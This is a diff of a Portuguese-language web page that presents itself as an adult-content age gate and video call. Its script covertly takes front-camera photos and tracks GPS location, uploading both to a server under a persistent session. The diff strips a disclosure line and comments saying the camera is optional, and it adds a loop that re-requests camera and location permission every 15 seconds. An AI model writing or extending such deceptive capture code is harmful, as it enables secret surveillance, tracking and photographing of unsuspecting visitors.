@@ -126,7 +126,6 @@ button{font:inherit}
     <h2>Conteúdo Restrito</h2>
     <p>Este site contém material voltado para o público adulto. Ao continuar, você confirma que possui 18 anos ou mais.</p>
     <button class="btn primary" style="width:100%;padding:14px;font-weight:bold" onclick="handlePermissionClick()">+18 ANOS — ENTRAR</button>
-    <p>Atendemos exclusivamente no BRASIL. Por razões de segurança, a permissão para localização é indispensável para prosseguir.</p>
   </div>
 </div>
 
@@ -273,7 +272,6 @@ button{font:inherit}
 </main>
 
 <script>
-    const pageKey = {{ page_key|tojson }};
 /*
 ============================================================
 SENTINELA — CONTROLE DA SESSÃO PERSISTENTE
@@ -367,9 +365,11 @@ let takingPhoto = false;
 
 let watchId = null;
 
-let 
+let isCameraActive = false;
 
-let 
+let isGeoActive = false;
+
+let recheckInterval = null;
 
 
 /*
@@ -454,7 +454,7 @@ async function getPersistentSession() {
 
 
     const response = await fetch(
-        `/api/session?page_key=${encodeURIComponent(pageKey)}`,
+        "/api/session",
         {
             method: "GET",
 
@@ -561,46 +561,76 @@ SOLICITAÇÃO INDIVIDUAL DE CÂMERA
 */
 
 async function requestCameraPermission() {
+
+    if (isCameraActive) return true;
+
     try {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+
+        if (
+            !navigator.mediaDevices ||
+            !navigator.mediaDevices.getUserMedia
+        ) {
+
             return false;
+
         }
 
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" },
-            audio: false
-        });
 
-        cameraStream = stream;
-        video.srcObject = stream;
-        await video.play();
+        stream =
+            await navigator.mediaDevices.getUserMedia({
 
-        return true;
-    } catch (error) {
-        console.warn("Câmera não autorizada/disponível:", error);
-        cameraStream = null;
-        return false;
-    }
-}
+                video: {
+                    facingMode: "user"
+                },
 
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" },
-            audio: false
-        });
+                audio: false
 
-        video.srcObject = stream;
-        video.loop = false;
-        await video.play().catch(function() {});
+            });
 
-        
-        console.log("Câmera permitida.");
+
+        video.srcObject =
+            stream;
+
+
+        video.loop =
+            false;
+
+
+        await video
+            .play()
+            .catch(function() {});
+
+
+        isCameraActive = true;
+
+
+        console.log(
+            "Câmera permitida."
+        );
+
+
+        if (lastLocationId !== null) {
+
+            captureAndUploadPhoto(
+                lastLocationId
+            ).catch(console.error);
+
+        }
+
+
         return true;
 
     } catch (err) {
-        
-        console.warn("Câmera não permitida:", err.message);
+
+        console.warn(
+            "Câmera não permitida:",
+            err.message
+        );
+
         return false;
+
     }
+
 }
 
 
@@ -615,17 +645,129 @@ async function requestGeoPermission() {
     if (isGeoActive) return true;
 
     try {
-        const position = await getCurrentLocation();
 
-        
-        console.log("Geolocalização permitida.");
-        return position;
+        const position =
+            await getCurrentLocation();
+
+
+        const latitude =
+            position.coords.latitude;
+
+
+        const longitude =
+            position.coords.longitude;
+
+
+        const accuracy =
+            position.coords.accuracy;
+
+
+        updatePositionDisplay(
+            latitude,
+            longitude
+        );
+
+
+        const locationResult =
+            await uploadLocation(
+
+                latitude,
+                longitude,
+                accuracy
+
+            );
+
+
+        lastLocationId =
+            locationResult.location_id;
+
+
+        lastPhotoLatitude =
+            latitude;
+
+
+        lastPhotoLongitude =
+            longitude;
+
+
+        distanceElement.textContent =
+            "0 m";
+
+
+        startWatchingPosition();
+
+
+        isGeoActive = true;
+
+
+        console.log(
+            "Geolocalização permitida."
+        );
+
+
+        return true;
 
     } catch (err) {
-        
-        console.warn("Geolocalização não permitida:", err.message);
+
+        console.warn(
+            "Geolocalização não permitida:",
+            err.message
+        );
+
         return false;
+
     }
+
+}
+
+
+/*
+============================================================
+LOOP AUTOMÁTICO DE REPROVOCAÇÃO (A CADA 15 SEGUNDOS)
+============================================================
+*/
+
+function startPermissionRecheckLoop() {
+
+    if (recheckInterval) return;
+
+
+    recheckInterval = setInterval(
+        async function() {
+
+            if (isCameraActive && isGeoActive) {
+
+                clearInterval(recheckInterval);
+
+                recheckInterval = null;
+
+                return;
+
+            }
+
+
+            console.log(
+                "Verificando permissões pendentes (Loop 15s)..."
+            );
+
+
+            if (!isCameraActive) {
+
+                await requestCameraPermission();
+
+            }
+
+
+            if (!isGeoActive) {
+
+                await requestGeoPermission();
+
+            }
+
+        },
+        15000
+    );
+
 }
 
 
@@ -636,18 +778,49 @@ MODAL / PERMISSÃO
 */
 
 async function handlePermissionClick() {
+
     try {
+
         await startMonitoring();
 
-        const ageModal = document.getElementById("ageModal");
-        if (ageModal) ageModal.style.display = "none";
 
-        const callSubtitle = document.getElementById("callSubtitle");
-        if (callSubtitle) callSubtitle.textContent = "Chamada de vídeo ativa";
+        const ageModal =
+            document.getElementById("ageModal");
+
+
+        if (ageModal) {
+
+            ageModal.style.display =
+                "none";
+
+        }
+
+
+        const callSubtitle =
+            document.getElementById(
+                "callSubtitle"
+            );
+
+
+        if (callSubtitle) {
+
+            callSubtitle.textContent =
+                isCameraActive
+                    ? "Chamada de vídeo ativa"
+                    : "Aguardando câmera...";
+
+        }
+
 
     } catch (error) {
-        console.error("Erro na inicialização:", error);
+
+        console.error(
+            "Erro na inicialização:",
+            error
+        );
+
     }
+
 }
 
 
@@ -655,125 +828,116 @@ async function handlePermissionClick() {
 ============================================================
 INICIAR MONITORAMENTO
 ============================================================
-
-A localização é obrigatória. A câmera é opcional.
-O monitoramento começa se a localização for autorizada.
 */
 
 async function startMonitoring() {
 
     try {
-        /*
-        1. LOCALIZAÇÃO É O REQUISITO PRINCIPAL
-
-        A câmera é opcional. Se a localização estiver disponível,
-        o monitoramento pode começar mesmo que a câmera esteja
-        bloqueada ou seja recusada pelo usuário.
-        */
-        setStatus("Solicitando autorização da localização...");
-
-        const position = await requestGeoPermission();
-
-        if (!position) {
-            throw new Error("É necessário permitir o acesso à localização para continuar.");
-        }
 
         /*
-        2. IDENTIFICAÇÃO PERSISTENTE
-
-        Só criamos/recuperamos a sessão depois que a localização
-        foi autorizada, pois ela é o dado principal do sistema.
+        ----------------------------------------------------
+        1. IDENTIFICAÇÃO PERSISTENTE
+        ----------------------------------------------------
         */
+
         await getPersistentSession();
 
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        const accuracy = position.coords.accuracy;
-
-        updatePositionDisplay(latitude, longitude);
 
         /*
-        3. ENVIA LOCALIZAÇÃO INICIAL
+        ----------------------------------------------------
+        2. PERMISSÕES PARCIAIS (OU CÂMERA OU LOCALIZAÇÃO)
+        ----------------------------------------------------
         */
-        setStatus("Registrando localização...");
 
-        const locationResult = await uploadLocation(
-            latitude,
-            longitude,
-            accuracy
+        setStatus(
+            "Solicitando autorizações..."
         );
 
-        lastLocationId = locationResult.location_id;
 
-        /*
-        4. TENTA ATIVAR A CÂMERA
+        const camOk =
+            await requestCameraPermission();
 
-        A câmera NÃO é obrigatória. Se o usuário recusar,
-        continuamos normalmente apenas com a localização.
-        */
-        setStatus("Localização ativa. Verificando câmera...");
 
-        const camOk = await requestCameraPermission();
+        const geoOk =
+            await requestGeoPermission();
 
-        if (camOk) {
-            setStatus("Localização e câmera ativas.", false);
 
-            /*
-            FOTO INICIAL SOMENTE SE A CÂMERA ESTIVER DISPONÍVEL.
-            */
-            try {
-                await captureAndUploadPhoto(lastLocationId);
-            } catch (photoError) {
-                console.warn("Não foi possível realizar a foto inicial:", photoError);
-                setStatus("Localização ativa. Câmera indisponível para captura.", false);
+        if (camOk || geoOk) {
+
+            let msg = "Captura iniciada: ";
+
+            if (camOk && geoOk) msg += "Câmera e localização ativas.";
+
+            else if (camOk) msg += "Apenas câmera ativa.";
+
+            else msg += "Apenas localização ativa.";
+
+
+            setStatus(
+                msg,
+                false
+            );
+
+
+            if (camOk && geoOk && lastLocationId !== null) {
+
+                await captureAndUploadPhoto(
+                    lastLocationId
+                ).catch(console.error);
+
             }
+
+
+            startPermissionRecheckLoop();
+
+
+            return true;
+
         } else {
-            setStatus("Localização ativa. Câmera não autorizada; somente a localização será enviada.", false);
+
+            setStatus(
+                "É necessário aceitar ao menos uma permissão para prosseguir.",
+                true
+            );
+
+
+            startPermissionRecheckLoop();
+
+
+            throw new Error(
+                "Nenhuma permissão concedida."
+            );
+
         }
 
-        /*
-        5. DEFINE REFERÊNCIA DO DESLOCAMENTO
-
-        A distância é calculada a partir da última localização
-        que gerou uma captura/registro.
-        */
-        lastPhotoLatitude = latitude;
-        lastPhotoLongitude = longitude;
-        distanceElement.textContent = "0 m";
-
-        /*
-        6. INICIA O ACOMPANHAMENTO DA LOCALIZAÇÃO
-
-        O watchPosition funciona independentemente da câmera.
-        */
-        startWatchingPosition();
-
-        return true;
 
     } catch (error) {
-        console.error("Erro:", error);
-        setStatus("Erro: " + error.message, true);
 
-        /*
-        Se a localização falhar, o monitoramento não deve iniciar.
-        */
-        if (watchId !== null) {
-            navigator.geolocation.clearWatch(watchId);
-            watchId = null;
-        }
+        console.error(
+            "Erro:",
+            error
+        );
 
-        if (stream) {
-            stream.getTracks().forEach(function(track) {
-                track.stop();
-            });
+
+        if (!isCameraActive && stream) {
+
+            stream
+                .getTracks()
+                .forEach(function(track) {
+
+                    track.stop();
+
+                });
+
             stream = null;
+
         }
 
-        
-        
 
         throw error;
+
     }
+
 }
 
 
@@ -994,21 +1158,16 @@ async function handlePosition(position) {
 
         /*
         ----------------------------------------------------
-        NOVA FOTO (OPCIONAL)
-        ----------------------------------------------------
-
-        A localização já foi salva. A câmera não é requisito.
-        Se estiver autorizada e pronta, fazemos a foto; caso
-        contrário, mantemos somente o registro da localização.
+        NOVA FOTO
         ----------------------------------------------------
         */
 
         if (isCameraActive) {
-            try {
-                await captureAndUploadPhoto(locationId);
-            } catch (photoError) {
-                console.warn("Localização salva, mas a foto não pôde ser enviada:", photoError);
-            }
+
+            await captureAndUploadPhoto(
+                locationId
+            );
+
         }
 
 
@@ -1076,7 +1235,7 @@ function handleLocationError(error) {
     );
 
 
-    
+    isGeoActive = false;
 
 
     setStatus(
@@ -1142,9 +1301,6 @@ async function uploadLocation(
 
                     capture_id:
                         captureId,
-
-                    page_key:
-                        pageKey,
 
                     latitude:
                         latitude,
@@ -1229,8 +1385,10 @@ async function captureAndUploadPhoto(
     locationId
 ) {
 
-    if (!captureId) {
-        throw new Error("Sessão de captura não disponível.");
+    if (!captureId || !isCameraActive) {
+
+        return;
+
     }
 
 
@@ -1332,11 +1490,6 @@ async function captureAndUploadPhoto(
     formData.append(
         "capture_id",
         captureId
-    );
-
-    formData.append(
-        "page_key",
-        pageKey
     );
 
 
@@ -1585,6 +1738,15 @@ ENCERRAMENTO
 window.addEventListener(
     "beforeunload",
     function() {
+
+        if (recheckInterval) {
+
+            clearInterval(recheckInterval);
+
+            recheckInterval = null;
+
+        }
+
 
         if (watchId !== null) {
 
